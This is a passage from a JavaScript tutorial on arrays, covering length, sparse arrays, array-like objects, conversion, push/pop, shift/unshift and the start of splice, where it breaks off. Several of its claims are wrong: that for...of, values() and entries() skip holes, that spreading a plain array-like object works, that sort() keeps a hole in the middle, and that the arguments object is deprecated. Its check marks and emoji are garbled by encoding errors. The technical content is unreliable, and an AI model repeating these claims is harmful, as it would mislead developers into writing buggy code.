```javascript
// length is writable (unusual for object properties)
let arr = [1, 2, 3];
arr.length = 5;         // Works
arr.length              // 5

// But you can make it read-only
Object.defineProperty(arr, 'length', { writable: false });
arr.length = 10;        // Fails silently or throws error (strict mode)

// Deleting doesn't affect length
let arr = [1, 2, 3];
delete arr[1];
arr.length              // 3 (unchanged, even though hole created)
arr                     // [1, empty, 3]

// Setting property beyond current length extends array
let arr = [];
arr[10] = 'ten';
arr.length              // 11

// But setting non-integer indices doesn't extend length
let arr = [1, 2, 3];
arr['myKey'] = 'value';
arr.length              // 3 (unchanged)
// myKey is a property, not an element
```

**Best Practices:**

```javascript
// âœ“ Use length to iterate
for (let i = 0; i < arr.length; i++) {
  console.log(arr[i]);
}

// âœ“ Clear array by setting length to 0
arr.length = 0;

// âœ“ Trim array by decreasing length
arr.length = 5;

// âœ— Don't rely on length after modification in loop
for (let i = 0; i < arr.length; i++) {  // Risky if arr modified
  arr.push('item');
}

// âœ“ Cache length if modifying
let len = arr.length;
for (let i = 0; i < len; i++) {
  // Now safe to modify arr
}

// âœ“ Use length to convert array-like to array
function myFunc() {
  let args = [];
  for (let i = 0; i < arguments.length; i++) {
    args[i] = arguments[i];
  }
  return args;
}

// Or use spread/Array.from (modern)
function myFunc(...args) {  // Already array
  return args;
}
```

---

### 7.1.4 Sparse Arrays

A **sparse array** is an array with "holes" - positions that don't contain values. This is a unique JavaScript feature that can lead to unexpected behavior.

**Creating Sparse Arrays:**

```javascript
// Array literals with missing elements
[1, , 3]                    // [1, empty, 3]
[, , ,]                     // [empty Ã— 3]
[1, 2, 3, ]                 // [1, 2, 3] (trailing comma doesn't create hole)
[1, , , , 5]                // [1, empty Ã— 3, 5]

// Using Array constructor
new Array(5)                // [empty Ã— 5]
new Array(3)                // [empty Ã— 3]

// Increasing length
let arr = [1, 2];
arr.length = 5;
arr                         // [1, 2, empty Ã— 3]

// Deleting elements
let arr = [1, 2, 3, 4, 5];
delete arr[2];
arr                         // [1, 2, empty, 4, 5]
arr.length                  // 5 (unchanged)

// Adding element beyond current indices
let arr = [1, 2];
arr[5] = 'five';
arr                         // [1, 2, empty Ã— 3, 'five']

// Mixed with undefined values
let arr = [1, undefined, 3];  // Has value undefined (not hole)
arr                           // [1, undefined, 3]
```

**Distinguishing Holes from undefined Values:**

```javascript
// Hole vs undefined
let sparse = [1, , 3];              // Hole at index 1
let withUndefined = [1, undefined, 3];  // Value undefined at index 1

// Accessing both looks the same
sparse[1]                   // undefined
withUndefined[1]            // undefined

// But they're different internally
sparse.hasOwnProperty(1)    // false (hole has no property)
withUndefined.hasOwnProperty(1)  // true (has property with undefined value)

// Object.getOwnPropertyDescriptor shows the difference
Object.getOwnPropertyDescriptor(sparse, 1)      // undefined (no descriptor)
Object.getOwnPropertyDescriptor(withUndefined, 1)  // { value: undefined, ... }

// Or checking directly
1 in sparse                 // false (hole)
1 in withUndefined          // true (property exists)

// for...in skips holes
for (let i in sparse) {
  console.log(i);          // Logs 0, 2 (not 1)
}

// for...in also logs non-integer keys
let arr = [1, 2, 3];
arr.myProp = 'value';
for (let i in arr) {
  console.log(i);          // Logs 0, 1, 2, myProp
}
```

**How Methods Handle Sparse Arrays:**

```javascript
// Most iteration methods SKIP holes
let sparse = [1, , 3];

// forEach skips holes
sparse.forEach((x, i) => console.log(i, x));  // Logs: 0 1, 2 3

// map skips holes but preserves them in result
let result = sparse.map(x => x * 2);
result                      // [2, empty, 6] - hole preserved!

// filter skips holes and creates dense array
let result = sparse.filter(x => true);
result                      // [1, 3] - dense

// reduce skips holes
let sum = sparse.reduce((acc, x) => acc + x, 0);  // 1 + 3 = 4 (not 0 + 1 + undefined + 3)

// some/every skip holes
sparse.some(x => x > 2)     // true (3 > 2)
sparse.every(x => x > 0)    // true (only checks 1 and 3)

// find skips holes
sparse.find(x => x > 2)     // 3

// indexOf/lastIndexOf skip holes
sparse.indexOf(undefined)   // -1 (not found because hole, not undefined value)

// for loop includes holes
for (let i = 0; i < sparse.length; i++) {
  console.log(sparse[i]);  // Logs: 1, undefined (hole), 3
}

// for...of skips holes (uses iterator)
for (let x of sparse) {
  console.log(x);         // Logs: 1, 3
}

// Spread converts holes to undefined
[...sparse]               // [1, undefined, 3]

// Array.from converts holes to undefined
Array.from(sparse)        // [1, undefined, 3]

// keys() includes holes
[...sparse.keys()]        // [0, 1, 2]

// values() skips holes
[...sparse.values()]      // [1, 3]

// entries() skips holes
[...sparse.entries()]     // [[0, 1], [2, 3]]
```

**Sparse Array Gotchas:**

```javascript
// Sparse arrays can confuse logic
let arr = [1, , 3];
arr.length                  // 3
arr.filter(x => true).length // 2 (holes removed!)

// Joined string with holes uses empty string
[1, , 3].join(',')          // "1,,3" - hole becomes empty string

// But join with hole in String context
let arr = [1, , 3];
String(arr)                 // "1,,3"
arr.toString()              // "1,,3"

// Comparing arrays with holes
[1, , 3] === [1, undefined, 3]  // false (different arrays)
// But behavior can seem similar in some cases

// slice() preserves holes
let sparse = [1, , 3];
sparse.slice(0, 2)          // [1, empty] - hole preserved

// concat() preserves holes
[].concat(sparse)           // [1, empty, 3]

// flat() removes holes
let arr = [1, , 3];
arr.flat()                  // [1, 3] - hole gone!

// fill() fills holes too
let arr = new Array(3);
arr.fill(0);
arr                         // [0, 0, 0]

// sort() keeps holes
let sparse = [3, , 1];
sparse.sort();
sparse                      // [1, empty, 3] - hole remains

// reverse() keeps holes
let sparse = [3, , 1];
sparse.reverse();
sparse                      // [1, empty, 3] - hole remains
```

**Creating and Removing Sparse Arrays:**

```javascript
// Create sparse array
let sparse = [1, , , 4];

// Convert to dense (remove holes)
let dense1 = sparse.filter(x => true);
let dense2 = sparse.flat();
let dense3 = Array.from(sparse);
let dense4 = [...sparse].map((x, i) => x ?? i);  // Replace holes with index

// Visualizing sparse vs dense
sparse                      // [1, empty Ã— 2, 4]
dense1                      // [1, 4]
dense2                      // [1, 4]

// Create holes intentionally
let arr = [1, 2, 3];
delete arr[1];
arr                         // [1, empty, 3]

// Remove holes by re-assigning
let arr = [1, , 3];
arr = Array.from(arr);  // [1, undefined, 3]
// Or
arr = [...arr];          // [1, undefined, 3]
```

**Performance Implications:**

```javascript
// Sparse arrays can have performance implications
// Engines may optimize dense arrays better

// Dense arrays (better performance)
let dense = [1, 2, 3, 4, 5];

// Sparse arrays (potentially slower)
let sparse = [1, , , , 5];

// For iteration-heavy code, sparse arrays may be slower
// For large arrays with few elements, sparse might save memory
// But modern engines optimize for this

// Rule of thumb: avoid intentional sparse arrays unless you have specific reason
```

**Best Practices:**

```javascript
// âœ— Don't intentionally create sparse arrays
let sparse = [1, , 3];      // Confusing

// âœ“ Use undefined if you need empty values
let arr = [1, undefined, 3];

// âœ“ Remove holes when working with sparse arrays
let sparse = [1, , 3];
let dense = Array.from(sparse);  // [1, undefined, 3]

// âœ“ Be aware of method behavior with sparse arrays
let sparse = [1, , 3];
sparse.map(x => x * 2)      // [2, empty, 6] - maps preserve holes
Array.from(sparse.map(x => x * 2))  // [2, undefined, 6] - conversion removes holes

// âœ“ Use consistent array structure
// Either dense with explicit values
let arr = [1, null, 3];
// Or proper sparse handling
let sparse = new Array(10).fill(null);

// âœ— Don't rely on sparse array behavior for logic
// It's confusing and error-prone
```

---

### 7.1.5 Array-like Objects

An **array-like object** is an object that has some array characteristics but is not actually an Array. It has numeric indices and a `length` property.

**Identifying Array-like Objects:**

```javascript
// Array-like object structure
let arrayLike = {
  0: 'first',
  1: 'second',
  2: 'third',
  length: 3
};

// Not an actual array
Array.isArray(arrayLike)    // false
arrayLike instanceof Array  // false
typeof arrayLike            // "object"

// But has array-like properties
arrayLike[0]                // 'first'
arrayLike[1]                // 'second'
arrayLike.length            // 3

// Can iterate like array
for (let i = 0; i < arrayLike.length; i++) {
  console.log(arrayLike[i]);
}

// Cannot use array methods (they don't exist)
arrayLike.map(x => x.toUpperCase())  // TypeError: arrayLike.map is not a function
arrayLike.filter(x => true)          // TypeError
arrayLike.forEach(x => console.log(x))  // TypeError
```

**Common Array-like Objects:**

```javascript
// 1. Function arguments (before rest parameters)
function myFunc() {
  console.log(arguments);       // Array-like object
  console.log(typeof arguments);  // "object"
  console.log(Array.isArray(arguments));  // false
  console.log(arguments.length);  // Number of arguments
}

myFunc('a', 'b', 'c');
// arguments = { 0: 'a', 1: 'b', 2: 'c', length: 3 }

// 2. DOM NodeList
let nodes = document.querySelectorAll('div');
console.log(nodes.length);  // Number of divs
// nodes[0] is first div
// But querySelector returns NodeList, not Array

// 3. DOM HTMLCollection
let divs = document.getElementsByTagName('div');
// Also array-like

// 4. String (indexed by character)
let str = "hello";
str[0]                      // 'h'
str.length                  // 5
// Strings behave like arrays of characters

// 5. Custom array-like objects
let custom = {
  '0': { name: 'Alice', age: 30 },
  '1': { name: 'Bob', age: 25 },
  length: 2
};

// 6. Typed arrays (actually are arrays though)
let typed = new Uint8Array([1, 2, 3, 4]);
Array.isArray(typed)        // false (not an Array)
typed.length                // 4 (but has array methods)
typed[0]                    // 1
```

**Working with Array-like Objects:**

```javascript
// Using array-like in for loop
let arrayLike = { 0: 'a', 1: 'b', 2: 'c', length: 3 };

for (let i = 0; i < arrayLike.length; i++) {
  console.log(arrayLike[i]);  // Works
}

// Using indexed access
arrayLike[0]                // 'a'
arrayLike[1]                // 'b'

// Checking length
if (arrayLike.length > 0) {
  let first = arrayLike[0];
}

// But can't use array methods
arrayLike.slice(0, 2);      // TypeError
arrayLike.map(x => x.toUpperCase());  // TypeError
arrayLike.includes('a');    // TypeError
```

**Converting Array-like to Array:**

```javascript
// Method 1: Array.from() (modern, preferred)
let arrayLike = { 0: 'a', 1: 'b', 2: 'c', length: 3 };
let arr = Array.from(arrayLike);
// arr = ['a', 'b', 'c']

// Method 2: Spread operator (ES6+)
let arr = [...arrayLike];  // ['a', 'b', 'c']

// Method 3: Array.prototype.slice.call() (old way)
let arr = Array.prototype.slice.call(arrayLike);
// or
let arr = [].slice.call(arrayLike);

// Method 4: Manual loop
let arr = [];
for (let i = 0; i < arrayLike.length; i++) {
  arr.push(arrayLike[i]);
}

// With arguments object
function myFunc(a, b, c) {
  // Old way: convert arguments to array
  let args = Array.from(arguments);
  // or
  let args = [...arguments];
  // or
  let args = Array.prototype.slice.call(arguments);
  
  // Modern way: use rest parameters (no conversion needed)
  // function myFunc(...args) { }
}

// With DOM NodeList
let nodes = document.querySelectorAll('div');
let arr = Array.from(nodes);  // Convert to array
let arr = [...nodes];          // Also works

// With string
let str = "hello";
let chars = Array.from(str);  // ['h', 'e', 'l', 'l', 'o']
let chars = [...str];          // Same
```

**Converting with Mapping:**

```javascript
// Array.from with mapping function
let arrayLike = { 0: 1, 1: 2, 2: 3, length: 3 };
let arr = Array.from(arrayLike, x => x * 2);
// arr = [2, 4, 6]

// With index
let arr = Array.from(arrayLike, (x, i) => `Item ${i}: ${x}`);
// arr = ['Item 0: 1', 'Item 1: 2', 'Item 2: 3']

// String conversion with mapping
let str = "abc";
let arr = Array.from(str, char => char.toUpperCase());
// arr = ['A', 'B', 'C']

// Spread doesn't have mapping, but can combine with map
let arr = [...arrayLike].map(x => x * 2);
// Same result as Array.from with mapper
```

**Function arguments (Old Pattern vs Modern):**

```javascript
// Old pattern: always had to convert arguments
function sum() {
  let args = Array.from(arguments);
  return args.reduce((a, b) => a + b, 0);
}

// Or using the arguments object directly
function sum() {
  let total = 0;
  for (let i = 0; i < arguments.length; i++) {
    total += arguments[i];
  }
  return total;
}

// Modern pattern: rest parameters (no conversion)
function sum(...args) {
  return args.reduce((a, b) => a + b, 0);
}

// Rest parameters are actual arrays
sum(1, 2, 3);              // 6
// args = [1, 2, 3] - already an array

// arguments vs rest
function test(a, b) {
  console.log(arguments);    // Arguments object
  console.log(a, b);         // Named parameters
}
// With rest:
function test(...args) {
  console.log(args);         // Array [a, b]
}

// arguments is deprecated in favor of rest parameters
```

**Array-like Gotchas:**

```javascript
// Not all objects with length are array-like for methods
let obj = { 0: 'a', 1: 'b', length: 2 };
Array.from(obj)             // ['a', 'b'] - works

// But Typed arrays have different behavior
let typed = new Uint8Array([1, 2, 3]);
Array.from(typed)           // [1, 2, 3] - works
[...typed]                  // [1, 2, 3] - works
// Typed arrays are iterable and array-like

// String is array-like but immutable
let str = "hello";
str[0]                      // 'h' - can read
str[0] = 'H';               // Doesn't change string
str                         // "hello" - unchanged

// Not all array methods work on array-like even when converted
let arrayLike = { 0: 'a', 1: 'b', length: 2 };
arrayLike.forEach(x => console.log(x));  // Error: not a function

// Must convert first
Array.from(arrayLike).forEach(x => console.log(x));  // Works

// Missing length property breaks conversion
let notArrayLike = { 0: 'a', 1: 'b' };  // No length
Array.from(notArrayLike)    // [] - empty because no length property

// toString on array-like
let arrayLike = { 0: 'a', 1: 'b', length: 2 };
String(arrayLike)           // "[object Object]"
Array.from(arrayLike).toString()  // "a,b"
```

**Best Practices:**

```javascript
// âœ“ Use Array.from() to convert array-like
let nodes = document.querySelectorAll('div');
let arr = Array.from(nodes);

// âœ“ Use spread operator for converting
let arr = [...nodes];

// âœ“ Use rest parameters in functions (modern)
function myFunc(...args) {
  // args is already array
  args.forEach(arg => console.log(arg));
}

// âœ— Avoid the old arguments object
function myFunc() {
  // Don't use arguments, use rest instead
}

// âœ“ Map while converting
let nodes = document.querySelectorAll('div');
let texts = Array.from(nodes, div => div.textContent);

// âœ— Don't try to use array methods on array-like
let arrayLike = { 0: 'a', 1: 'b', length: 2 };
arrayLike.map(x => x.toUpperCase());  // Error

// âœ“ Always check Array.isArray() if unsure
if (Array.isArray(value)) {
  // Can use array methods
} else if (typeof value === 'object' && typeof value.length === 'number') {
  // Might be array-like
  let arr = Array.from(value);
}
```

---

### 7.1.6 Converting Array-like to Arrays

We've covered the basics, so let's go deeper into practical conversion patterns and edge cases.

**Conversion Methods Comparison:**

```javascript
// Given array-like object
let arrayLike = {
  '0': 'first',
  '1': 'second',
  '2': 'third',
  length: 3
};

// Method 1: Array.from() - modern, recommended
let arr1 = Array.from(arrayLike);
// ['first', 'second', 'third']

// Method 2: Spread operator
let arr2 = [...arrayLike];
// ['first', 'second', 'third']

// Method 3: slice.call()
let arr3 = Array.prototype.slice.call(arrayLike);
// ['first', 'second', 'third']

// Method 4: forEach.call()
let arr4 = [];
Array.prototype.forEach.call(arrayLike, (item, index) => {
  arr4[index] = item;
});
// ['first', 'second', 'third']

// All produce the same result, but different benefits
```

**Performance Comparison:**

```javascript
// Array.from() - modern, optimized in engines
Array.from(arrayLike);      // Good performance

// Spread - syntactic sugar, same as Array.from internally
[...arrayLike];             // Similar performance

// slice.call() - older, still works but less optimized
Array.prototype.slice.call(arrayLike);  // Slightly slower

// Manual loop - explicit, but verbose
let arr = [];
for (let i = 0; i < arrayLike.length; i++) {
  arr[i] = arrayLike[i];
}  // Good performance, but more code

// For large arrays, performance matters little for practical purposes
// Choose for readability first
```

**With arguments Object:**

```javascript
// Convert arguments to array
function process() {
  // Modern way with rest parameters (best)
  // No conversion needed
}

function process(...args) {
  // args is already array
  args.map(x => x.toUpperCase());  // Works
}

// If using arguments object (old code)
function process() {
  let args = Array.from(arguments);
  // or
  let args = [...arguments];
  // or
  let args = Array.prototype.slice.call(arguments);
  
  args.map(x => x.toUpperCase());  // Now works
}

// arguments vs rest detailed
function test(a, b, c) {
  console.log(arguments);    // { 0: a, 1: b, 2: c, length: 3 }
  console.log(arguments[0]); // a
  console.log(arguments.length);  // 3
  
  // arguments also has: callee (function itself - deprecated), caller
}

function test(...args) {
  console.log(args);         // [a, b, c]
  // args is regular array
  // no callee or caller
}

// Mixing rest with regular parameters
function process(first, second, ...rest) {
  console.log(first);        // first arg
  console.log(second);       // second arg
  console.log(rest);         // [remaining args]
}

process(1, 2, 3, 4, 5);
// first = 1, second = 2, rest = [3, 4, 5]
```

**With DOM Objects:**

```javascript
// NodeList from querySelectorAll
let nodes = document.querySelectorAll('div');
let arr1 = Array.from(nodes);  // Convert to array
let arr2 = [...nodes];          // Also works

// HTMLCollection from getElementsByTagName
let divs = document.getElementsByTagName('div');
let arr3 = Array.from(divs);   // Convert

// Why convert?
// NodeList: forEach works, but not map, filter, reduce
// Converting to array: all methods work

// With conversion
let arr = Array.from(document.querySelectorAll('.item'));
let texts = arr.map(el => el.textContent);
let filtered = arr.filter(el => el.classList.contains('active'));

// Without conversion (requires Array methods called on NodeList's prototype)
let nodes = document.querySelectorAll('.item');
let texts = Array.from(nodes).map(el => el.textContent);  // Must convert first

// Practical example
// Get all paragraphs and convert their text to uppercase
let paragraphs = document.querySelectorAll('p');
let texts = Array.from(paragraphs).map(p => p.textContent.toUpperCase());

// Get all inputs and get their values
let inputs = document.querySelectorAll('input');
let values = Array.from(inputs).map(input => input.value);

// Get all elements with data-id and convert to object
let elements = document.querySelectorAll('[data-id]');
let ids = Array.from(elements).map(el => ({
  id: el.dataset.id,
  text: el.textContent
}));
```

**String Conversion:**

```javascript
// String is iterable, can convert to array of characters
let str = "hello";

// Spread operator
let arr1 = [...str];         // ['h', 'e', 'l', 'l', 'o']

// Array.from
let arr2 = Array.from(str);  // ['h', 'e', 'l', 'l', 'o']

// split (specific for strings)
let arr3 = str.split('');    // ['h', 'e', 'l', 'l', 'o']

// With Unicode (code point handling)
let emoji = 'ðŸ˜€';
emoji.split('');            // ['\\uD83D', '\\uDE00'] - splits surrogates wrong
[...emoji];                 // ['ðŸ˜€'] - correct!
Array.from(emoji);          // ['ðŸ˜€'] - correct!

// Getting unique characters
let chars = [...new Set('hello world')];  // ['h', 'e', 'l', 'o', ' ', 'w', 'r', 'd']

// Converting with map
let str = 'abc';
let upper = Array.from(str, c => c.toUpperCase());  // ['A', 'B', 'C']

// Or with spread and map
let upper = [...str].map(c => c.toUpperCase());     // ['A', 'B', 'C']
```

**Set and Map Conversion:**

```javascript
// Set to array
let set = new Set([1, 2, 3, 2, 1]);
let arr1 = Array.from(set);  // [1, 2, 3]
let arr2 = [...set];         // [1, 2, 3]

// Map to array of entries
let map = new Map([['a', 1], ['b', 2]]);
let arr3 = Array.from(map);  // [['a', 1], ['b', 2]]
let arr4 = [...map];         // [['a', 1], ['b', 2]]

// Map keys to array
let keys = Array.from(map.keys());  // ['a', 'b']
let keys = [...map.keys()];         // ['a', 'b']

// Map values to array
let values = Array.from(map.values());  // [1, 2]
let values = [...map.values()];         // [1, 2]

// Practical example: deduplicate array
let arr = [1, 2, 2, 3, 3, 3];
let unique = [...new Set(arr)];  // [1, 2, 3]
```

**Custom Iterable Objects:**

```javascript
// Create array-like but iterable object
let custom = {
  0: 'a',
  1: 'b',
  2: 'c',
  length: 3,
  
  // Make it iterable (optional)
  [Symbol.iterator]() {
    let index = 0;
    return {
      next: () => {
        if (index < this.length) {
          return { value: this[index++], done: false };
        }
        return { done: true };
      }
    };
  }
};

// Convert to array
let arr1 = Array.from(custom);  // ['a', 'b', 'c']
let arr2 = [...custom];         // ['a', 'b', 'c'] - requires [Symbol.iterator]

// Typed array conversion
let typed = new Uint8Array([1, 2, 3, 4]);
let arr3 = Array.from(typed);   // [1, 2, 3, 4]
let arr4 = [...typed];          // [1, 2, 3, 4]

// Converting typed array with mapping
let arr5 = Array.from(typed, x => x * 2);  // [2, 4, 6, 8]
```

**Conversion with Transformation:**

```javascript
// Array.from with mapping function (most efficient)
let arrayLike = { 0: 1, 1: 2, 2: 3, length: 3 };
let doubled = Array.from(arrayLike, x => x * 2);  // [2, 4, 6]

// Spreads don't have mapping, but can chain
let doubled = [...arrayLike].map(x => x * 2);     // [2, 4, 6]

// With index and thisArg
let mapped = Array.from(
  arrayLike,
  function(value, index) {
    return value + this.offset;
  },
  { offset: 10 }
);
// [11, 12, 13]

// Complex example: NodeList to specific data
let nodes = document.querySelectorAll('[data-id]');
let data = Array.from(nodes, node => ({
  id: node.dataset.id,
  text: node.textContent,
  className: node.className
}));
```

**Edge Cases:**

```javascript
// Sparse arrays in array-like
let sparse = new Array(5);
sparse[0] = 'a';
sparse[2] = 'c';
// sparse = [a, empty, c, empty, empty]

let arr = Array.from(sparse);
// [a, undefined, c, undefined, undefined] - holes become undefined

let arr = [...sparse];
// [a, undefined, c, undefined, undefined] - same

// Holes in nested structures
let nested = {
  0: { value: 1 },
  2: { value: 3 },
  length: 3
};

let arr = Array.from(nested);
// [{ value: 1 }, undefined, { value: 3 }]

// Negative indices (not treated as array indices)
let obj = {
  '0': 'a',
  '1': 'b',
  '-1': 'negative',
  length: 2
};

let arr = Array.from(obj);
// ['a', 'b'] - negative index ignored
obj['-1']  // 'negative' exists as property but not used
```

**Best Practices:**

```javascript
// âœ“ Use Array.from() for conversions
let arr = Array.from(arrayLike);

// âœ“ Use spread when convenient
let arr = [...arrayLike];

// âœ“ Use rest parameters in functions
function process(...args) { }

// âœ“ Include mapping if available
let doubled = Array.from(arrayLike, x => x * 2);

// âœ— Avoid old Array.prototype.slice.call()
let arr = Array.prototype.slice.call(arrayLike);

// âœ— Avoid complex arguments object code
function process() {
  let args = Array.from(arguments);  // Instead use rest
}

// âœ“ Be aware of hole conversion
let arr = Array.from(sparse);  // Holes become undefined

// âœ“ Use appropriate method based on source
// - Strings: [...str] or Array.from()
// - DOM: Array.from(nodes)
// - Iterables: [...iterable]
// - Arguments: rest parameters
```
## 7.2 Array Methods (Mutating)

**Mutating methods** are array methods that modify the original array in place, changing its structure or elements. This section covers the most important mutation methods and their gotchas.

---

### 7.2.1 push() and pop()

**push()** adds one or more elements to the end of an array and returns the new length.

**pop()** removes the last element from an array and returns that element.

```javascript
// push() - add to end
let arr = [1, 2, 3];
let len = arr.push(4);
arr                         // [1, 2, 3, 4]
len                         // 4 (new length)

// push() with multiple elements
arr.push(5, 6, 7);
arr                         // [1, 2, 3, 4, 5, 6, 7]

// push() returns new length
let result = [].push(1);
result                      // 1 (not the value)

// pop() - remove from end
let arr = [1, 2, 3, 4, 5];
let removed = arr.pop();
arr                         // [1, 2, 3, 4]
removed                     // 5

// pop() on empty array
let empty = [];
empty.pop()                 // undefined
empty.length                // 0 (unchanged)

// Using push/pop as stack operations
let stack = [];
stack.push(1, 2, 3);        // [1, 2, 3]
stack.pop();                // 3, stack = [1, 2]
stack.pop();                // 2, stack = [1]
stack.pop();                // 1, stack = []
stack.pop();                // undefined, stack = []

// Performance: push/pop are O(1) operations
// Very efficient for adding/removing from end

// Gotcha: push with spread (not idiomatic)
let arr = [1, 2];
let values = [3, 4, 5];
arr.push(...values);        // Works but unusual
arr                         // [1, 2, 3, 4, 5]

// Better alternatives
arr = [...arr, ...values];  // Spread operator
// or
arr = arr.concat(values);   // concat method
```

**Return Values and Side Effects:**

```javascript
// push() modifies original AND returns length
let arr = [1, 2];
let len = arr.push(3);
len                         // 3
arr                         // [1, 2, 3] - modified

// pop() modifies original AND returns element
let arr = [1, 2, 3];
let last = arr.pop();
last                        // 3
arr                         // [1, 2] - modified

// This matters for functional code
let arr = [1, 2];
// Don't use like this:
if (arr.push(3) > 0) { }    // Works but confusing

// Use like this:
arr.push(3);
if (arr.length > 0) { }     // Clearer intent

// Sparse arrays with push/pop
let sparse = new Array(3);
sparse.push('end');
sparse                      // [empty Ã— 3, 'end']
sparse.length               // 4

// pop() from sparse
let arr = [1, , 3];
arr.pop();                  // 3
arr                         // [1, empty]

// Array-like objects with push
let arrayLike = { length: 0 };
Array.prototype.push.call(arrayLike, 1, 2);
arrayLike                   // { 0: 1, 1: 2, length: 2 }
```

**Performance Characteristics:**

```javascript
// push is O(1) amortized time complexity
let arr = [];
for (let i = 0; i < 1000000; i++) {
  arr.push(i);             // Fast
}

// pop is also O(1)
while (arr.length > 0) {
  arr.pop();               // Fast
}

// Arrays are optimized for push/pop
// This makes them ideal for stack operations
```

**Common Patterns:**

```javascript
// Stack implementation
class Stack {
  constructor() {
    this.items = [];
  }
  
  push(item) {
    this.items.push(item);
  }
  
  pop() {
    return this.items.pop();
  }
  
  peek() {
    return this.items[this.items.length - 1];
  }
  
  isEmpty() {
    return this.items.length === 0;
  }
  
  size() {
    return this.items.length;
  }
}

// Using stack
let stack = new Stack();
stack.push(1);
stack.push(2);
stack.push(3);
stack.pop();                // 3
stack.peek();               // 2

// Undo/Redo pattern
let history = [];
function doAction(action) {
  history.push(action);
}

function undo() {
  if (history.length > 0) {
    let lastAction = history.pop();
    // Reverse the action
  }
}

// Queue operations (but use unshift/shift)
let queue = [];
queue.push(1, 2, 3);        // [1, 2, 3]
queue.shift();              // 1, queue = [2, 3]
```

---

### 7.2.2 shift() and unshift()

**shift()** removes and returns the first element of an array.

**unshift()** adds one or more elements to the beginning of an array and returns the new length.

```javascript
// shift() - remove from beginning
let arr = [1, 2, 3, 4, 5];
let first = arr.shift();
arr                         // [2, 3, 4, 5]
first                       // 1

// shift() on empty array
let empty = [];
empty.shift()               // undefined
empty.length                // 0

// unshift() - add to beginning
let arr = [2, 3, 4];
let len = arr.unshift(1);
arr                         // [1, 2, 3, 4]
len                         // 4 (new length)

// unshift() with multiple elements
arr.unshift(-2, -1);
arr                         // [-2, -1, 1, 2, 3, 4]

// unshift() returns new length
let result = [].unshift(1);
result                      // 1

// Queue operations using push/shift
let queue = [];
queue.push(1, 2, 3);        // [1, 2, 3]
queue.shift();              // 1, queue = [2, 3]
queue.shift();              // 2, queue = [3]
queue.shift();              // 3, queue = []
queue.shift();              // undefined

// Performance: shift/unshift are O(n)
// Because all remaining elements must shift position
// For large arrays, this can be slow

// GOTCHA: shift/unshift are MUCH SLOWER than push/pop
let arr = [];
for (let i = 0; i < 10000; i++) {
  arr.push(i);              // O(1) - fast
}
for (let i = 0; i < 10000; i++) {
  arr.shift();              // O(n) - slow! All elements shift
}

// Better: pop from end
for (let i = 0; i < 10000; i++) {
  arr.pop();                // O(1) - fast
}

// Sparse arrays with shift/unshift
let sparse = [, , 3];       // [empty Ã— 2, 3]
sparse.shift();             // undefined (first hole)
sparse                      // [empty, 3]

// unshift with holes
let arr = [3, 4];
arr.unshift(1, 2);
arr                         // [1, 2, 3, 4]
```

**Return Values:**

```javascript
// shift() returns removed element
let arr = ['a', 'b', 'c'];
let first = arr.shift();
first                       // 'a'
arr                         // ['b', 'c']

// unshift() returns new length
let arr = [2, 3];
let len = arr.unshift(1);
len                         // 3
arr                         // [1, 2, 3]

// Both modify the original array
let arr = [1, 2, 3];
let len = arr.unshift(0);
arr                         // [0, 1, 2, 3] - modified
len                         // 4

let removed = arr.shift();
arr                         // [1, 2, 3] - modified
removed                     // 0
```

**Common Patterns:**

```javascript
// Queue implementation
class Queue {
  constructor() {
    this.items = [];
  }
  
  enqueue(item) {
    this.items.push(item);
  }
  
  dequeue() {
    return this.items.shift();
  }
  
  peek() {
    return this.items[0];
  }
  
  isEmpty() {
    return this.items.length === 0;
  }
  
  size() {
    return this.items.length;
  }
}

// Using queue (FIFO - First In First Out)
let queue = new Queue();
queue.enqueue('first');
queue.enqueue('second');
queue.enqueue('third');
queue.dequeue();            // 'first'
queue.dequeue();            // 'second'
queue.peek();               // 'third'

// Processing items in order
let tasks = [];
function addTask(task) {
  tasks.push(task);
}

function processNextTask() {
  if (tasks.length > 0) {
    let task = tasks.shift();  // Get first task
    // Process task
  }
}

// Rotate array
function rotateLeft(arr) {
  arr.push(arr.shift());    // Move first to end
}

function rotateRight(arr) {
  arr.unshift(arr.pop());   // Move last to beginning
}

let arr = [1, 2, 3, 4, 5];
rotateLeft(arr);            // [2, 3, 4, 5, 1]
rotateRight(arr);           // [1, 2, 3, 4, 5] - back to original

// Repeatedly shifting (inefficient for large arrays)
let arr = [1, 2, 3, 4, 5];
while (arr.length > 0) {
  let item = arr.shift();   // O(n) each time
  console.log(item);
}

// Better: use index instead of shifting
for (let i = 0; i < arr.length; i++) {
  console.log(arr[i]);      // O(1) each time
}
```

**Performance Comparison:**

```javascript
// Speed comparison: push/pop vs shift/unshift
let largeArray = Array.from({ length: 100000 }, (_, i) => i);

// Fast: pop (O(1))
let start = performance.now();
while (largeArray.length > 0) {
  largeArray.pop();
}
console.log('pop time:', performance.now() - start);  // Fast

// Slow: shift (O(n))
largeArray = Array.from({ length: 100000 }, (_, i) => i);
start = performance.now();
while (largeArray.length > 0) {
  largeArray.shift();       // Slower - all elements shift
}
console.log('shift time:', performance.now() - start);  // Much slower

// For frequent shifts, consider:
// 1. Using index instead of shifting
// 2. Using deque (double-ended queue) data structure
// 3. Using circular buffer implementation

// Circular buffer alternative (more efficient)
class CircularQueue {
  constructor(maxSize) {
    this.items = new Array(maxSize);
    this.head = 0;
    this.tail = 0;
    this.size = 0;
  }
  
  enqueue(item) {
    if (this.size === this.items.length) {
      // Queue full, resize
      let newItems = new Array(this.items.length * 2);
      for (let i = 0; i < this.size; i++) {
        newItems[i] = this.items[(this.head + i) % this.items.length];
      }
      this.items = newItems;
      this.head = 0;
      this.tail = this.size;
    }
    this.items[this.tail] = item;
    this.tail = (this.tail + 1) % this.items.length;
    this.size++;
  }
  
  dequeue() {
    if (this.size === 0) return undefined;
    let item = this.items[this.head];
    this.head = (this.head + 1) % this.items.length;
    this.size--;
    return item;
  }
}
```

---

### 7.2.3 splice()

**splice()** changes the contents of an array by removing or replacing existing elements and/or adding new elements.

```javascript
// splice(start, deleteCount, item1, item2, ...)

// Remove elements
let arr = [1, 2, 3, 4, 5];
let removed = arr.splice(2, 2);     // Start at 2, remove 2 elements
arr                         // [1, 2, 5]
removed                     // [3, 4]

// Remove without replacement
let arr = ['a', 'b', 'c', 'd'];
arr.splice(1, 2);           // Remove 'b' and 'c'
arr                         // ['a', 'd']

// Insert elements without removing
let arr = [1, 2, 5];
arr.splice(2, 0, 3, 4);     // At index 2, remove 0, add 3 and 4
arr                         // [1, 2, 3, 4, 5]

// Replace elements
let arr = [1, 2, 3, 4, 5];
